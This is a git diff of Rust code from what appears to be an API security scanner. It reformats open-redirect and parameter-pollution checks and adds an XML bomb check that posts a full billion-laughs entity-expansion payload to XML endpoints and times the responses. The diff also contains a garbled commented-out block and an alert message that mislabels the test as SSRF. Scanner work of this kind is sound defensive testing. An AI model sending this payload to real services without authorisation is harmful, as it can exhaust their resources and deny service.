@@ -1,5 +1,7 @@
 use super::{utils::create_payload_for_get, utils::create_string, *};
+use serde::de::value;
 use serde_json::json;
+use std::time::{Duration, Instant, SystemTime};
 // &use mapper::digest::Method&::POST&;
 use colored::*;
 const LIST_METHOD: [Method; 3] = [Method::GET, Method::POST, Method::PUT];
@@ -267,37 +269,36 @@ impl<T: OAS + Serialize> ActiveScan<T> {
                         Some("https://blst.security.com".to_string()),
                     );
                     for param_item in &vec_param {
-                        if  param_item.dm == QuePay::Query && LIST_PARAM.contains(&param_item.name.as_str()) {
+                        if param_item.dm == QuePay::Query
+                            && LIST_PARAM.contains(&param_item.name.as_str())
+                        {
                             let param_to_redirect = param_item.name.to_owned();
                             let req = AttackRequest::builder()
-                            .uri(&base_url.url, path)
-                            .parameters(vec_param.clone())
-                            .auth(auth.clone())
-                            .method(m)
-                            .headers(vec![])
-                            .auth(auth.clone())
-                            .build();
-                        if let Ok(res) = req.send_request(true).await {
-                            //logging
-                            //logging request/response/description
-                            ret_val
-                                .1
-                                .push(&req, &res, "Testing open-redirect".to_string());
-                            ret_val.0.push((
+                                .uri(&base_url.url, path)
+                                .parameters(vec_param.clone())
+                                .auth(auth.clone())
+                                .method(m)
+                                .headers(vec![])
+                                .auth(auth.clone())
+                                .build();
+                            if let Ok(res) = req.send_request(true).await {
+                                //logging
+                                //logging request/response/description
+                                ret_val
+                                    .1
+                                    .push(&req, &res, "Testing open-redirect".to_string());
+                                ret_val.0.push((
                                 ResponseData{
                                     location: path.clone(),
                                     alert_text: format!("The parameter {} seems to be vulerable to open-redirect, location: {}  ",param_to_redirect,path)
                                 },
                             res.clone(),
                             ));
-                        } else {
-                            println!("REQUEST FAILED");
+                            } else {
+                                println!("REQUEST FAILED");
+                            }
+                            break;
                         }
-                        break;
-                        }
-                       
-                           
-                        
                     }
                 }
             }
@@ -319,50 +320,48 @@ impl<T: OAS + Serialize> ActiveScan<T> {
                 let _text = path.to_string();
                 //   println!("{:?}", text);
                 if m == Method::GET {
-                    let mut vec_param = create_payload_for_get(
-                        &self.oas_value,
-                        op,None
-                    );
+                    let mut vec_param = create_payload_for_get(&self.oas_value, op, None);
                     //let param_to_add =vec_param.iter().find(|&x| x.dm == QuePay::Query ).collect;
-                    let indices = vec_param.iter().enumerate().filter(|(_,x)| x.dm == QuePay::Query).map(|(index, _)| index).collect::<Vec<_>>();
-                    for i in indices{
+                    let indices = vec_param
+                        .iter()
+                        .enumerate()
+                        .filter(|(_, x)| x.dm == QuePay::Query)
+                        .map(|(index, _)| index)
+                        .collect::<Vec<_>>();
+                    for i in indices {
                         let param_query_pollute = vec_param.get(i).unwrap().clone();
                         vec_param.push(param_query_pollute);
-                    let req = AttackRequest::builder()
-                                    .uri(&base_url.url, path)
-                                    .auth(auth.clone())
-                                    .parameters(vec_param.clone()
-                                    )
-                                    .method(m)
-                                    .headers(vec![])
-                                    .auth(auth.clone())
-                                    .build();
-                                println!("Pollution ");
-                                if let Ok(res) = req.send_request(true).await {
-                                    //logging request/response/description
-                                    ret_val.1.push(
-                                        &req,
-                                        &res,
-                                        " Testing get parameter pollution ".to_string(),
-                                    );
-                                    ret_val.0.push((
+                        let req = AttackRequest::builder()
+                            .uri(&base_url.url, path)
+                            .auth(auth.clone())
+                            .parameters(vec_param.clone())
+                            .method(m)
+                            .headers(vec![])
+                            .auth(auth.clone())
+                            .build();
+                        println!("Pollution ");
+                        if let Ok(res) = req.send_request(true).await {
+                            //logging request/response/description
+                            ret_val.1.push(
+                                &req,
+                                &res,
+                                " Testing get parameter pollution ".to_string(),
+                            );
+                            ret_val.0.push((
                                         ResponseData{
                                             location: path.clone(),
                                             alert_text: format!("The endpoint {} seems to be vulerable to parameter pollution on the {} parameter",path,vec_param.last().unwrap().name)
                                         },
                                         res.clone(),
                                     ));
-                                } else {
-                                    println!("REQUEST FAILED");
-                                }
-                            
-                                vec_param.remove(vec_param.len()-1);
-                            }
+                        } else {
+                            println!("REQUEST FAILED");
+                        }
+
+                        vec_param.remove(vec_param.len() - 1);
+                    }
                 }
-                  
-                
             }
-           
         }
         (ret_val, vec_polluted)
     }
@@ -487,7 +486,6 @@ impl<T: OAS + Serialize> ActiveScan<T> {
         //roblem with order ouput
         //TODO FIX BUG ABOUT OUTPUT
         if let Some(compo) = &self.oas.components().unwrap().parameters {
-            
             for (i, y) in compo {
                 println!(
                     "parameter i:{:?} ,y{:?}",
@@ -576,14 +574,16 @@ impl<T: OAS + Serialize> ActiveScan<T> {
 
         for (path, item) in &self.oas.get_paths() {
             for (m, op) in item.get_ops() {
-
                 if m == Method::GET {
                     let mut param_is_good_to_send = false;
 
                     for (provider_item, value_to_send) in &provider_hash {
                         let mut params_vec = vec![];
-                        let payload_get_param =
-                            create_payload_for_get(&self.oas_value, op, Some(value_to_send.to_string()));
+                        let payload_get_param = create_payload_for_get(
+                            &self.oas_value,
+                            op,
+                            Some(value_to_send.to_string()),
+                        );
                         for parameter_item in payload_get_param {
                             if parameter_item.dm == QuePay::Query {
                                 if LIST_PARAM.contains(&parameter_item.name.as_str()) {
@@ -704,5 +704,177 @@ impl<T: OAS + Serialize> ActiveScan<T> {
             }
         }
         (ret_val, provider_vec)
+    }
+    // pub async fn check_xss_reflected(&self, auth: Authorization) -> Vec<Alert> {
+    //     let mut ret_val = CheckRetVal::default();
+    //     for oas_map in self.payloads.iter() {
+    //         for (json_path, schema) in &oas_map.payload.map {
+    //                 //
+    //                 //println!("popopopopopopo");
+
+    //                 // .filter_map(|x| x){
+    //                 for (m, _) in oas_map                        println!("popopopopopopo");
+
+    //                     .path
+    //                     .path_item
+    //                     .get_ops()
+    //                     .iter()
+    //                     .filter(|(m, _)| m == &Method::POST)
+    //                 {
+    //                     let url;
+    //                     if let Some(servers) = &self.oas.servers() {
+    //                         if let Some(s) = servers.first() {
+    //                             url = s.url.clone();
+    //                         } else {
+    //                             continue;
+    //                         };
+    //                     } else {
+    //                         continue;
+    //                     };
+    //                     let req = AttackRequest::builder()
+    //                         .uri(&url, &oas_map.path.path)
+    //                         .method(*m)
+    //                         .headers(vec![])
+    //                         .parameters(vec![])
+    //                         .auth(auth.clone())
+    //                         .payload(
+    //                             &change_payload(&oas_map.payload.payload, json_path, json!(val.1))
+    //                                 .to_string(),
+    //                         )
+    //                         .build();
+    //                     //    dbg!(&req);
+    //                     print!("Min mAx : ");
+
+    //                     if let Ok(res) = req.send_request(true).await {
+    //                         //logging request/response/description
+    //                         ret_val
+    //                             .1
+    //                             .push(&req, &res, "Testing min/max values".to_string());
+    //                         ret_val.0.push((
+    //                             ResponseData {
+    //                                 location: oas_map.path.path.clone(),
+    //                                 alert_text: format!(
+    //                                     "The {} for {} is not enforced by the server",
+    //                                     val.0,
+    //                                     json_path[json_path.len() - 1]
+    //                                 ),
+    //                             },
+    //                             res.clone(),
+    //                         ));
+    //                         println!(
+    //                             "{}:{}",
+    //                             "Status".green().bold(),
+    //                             res.status.to_string().magenta()
+    //                         );
+    //                     } else {
+    //                         println!("REQUEST FAILED");
+    //                     }
+    //                 }
+    //             }
+    //         }
+    //         ret_val
+    //     }
+    pub async fn check_xml_bomb(&self, auth: &Authorization) -> (CheckRetVal, Vec<Duration>) {
+        let body = format!(
+            r#"
+        <?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE lolz [
+<!ENTITY lol "lol">
+<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz
+        "#
+        );
+        let mut ret_val = CheckRetVal::default();
+        let mut vec_time = vec![];
+        //     if let Some(content) =  &op.request_body{
+
+        for oas_map in self.payloads.iter() {
+            for (json_path, schema) in &oas_map.payload.map {
+                // .filter_map(|x| x){
+                for (m, _operation) in oas_map
+                    .path
+                    .path_item
+                    .get_ops()
+                    .iter()
+                    .filter(|(m, _)| m == &Method::POST)
+                    .filter(|(_method, operation)| {
+                        operation
+                            .request_body
+                            .clone()
+                            .unwrap_or_default()
+                            .inner(&self.oas_value)
+                            .content
+                            .into_keys()
+                            .collect::<Vec<String>>()
+                            .contains(&"application/xml".to_string())
+
+                        // if let Some(value) =   &operation.request_body{
+                        //      for ( string_item, Mediatype_item) in  &value.inner(&self.oas_value).content  {
+                        //         println!("{:?}", string_item);
+                        //         if string_item == "application/xml"{
+                        //             println!("THere is one least");
+                        //         }
+                        //     ;
+                        // }
+                    })
+                    .next()
+                //       .filter(|(operation)|   operation.1.request_body.unwrap().clone().inner(&self.oas_value).content.keys())
+                {
+                    //  println!("{:?}", operation);
+                    println!("ENCONDING {:?}", &oas_map.path.path);
+                    let h = MHeader {
+                        name: "Content-type".to_string(),
+                        value: "application/xml".to_string(),
+                    };
+                    let base_url = self.oas.servers().unwrap().iter().next().unwrap().clone();
+                    let req = AttackRequest::builder()
+                        .uri(&base_url.url, &oas_map.path.path)
+                        .method(*m)
+                        .headers(vec![h])
+                        .payload(&body)
+                        .parameters(vec![])
+                        .auth(auth.clone())
+                        .build();
+
+                    print!("XML BOMB : ");
+
+                    /* let start = Instant::now();
+                    expensive_function();
+                    let duration = start.elapsed(); */
+                    let start = Instant::now();
+                    if let Ok(res) = req.send_request(true).await {
+                        //logging request/response/description
+                        ret_val.1.push(&req, &res, "Test for XML BOMB".to_string());
+                        ret_val.0.push((
+                            ResponseData {
+                                location: oas_map.path.path.clone(),
+                                alert_text: format!(
+                                        "This  parameter on the endpoint seems to be vulerable to ssrf.", // json_path[json_path.len() - 1]
+                                    ),
+                            },
+                            res.clone(),
+                        ));
+                        println!(
+                            "{}:{}",
+                            "Status".green().bold(),
+                            res.status.to_string().magenta()
+                        );
+                    } else {
+                        println!("REQUEST FAILED");
+                    }
+                    vec_time.push(start.elapsed());
+                }
+            }
+        }
+        (ret_val, vec_time)
     }
 }
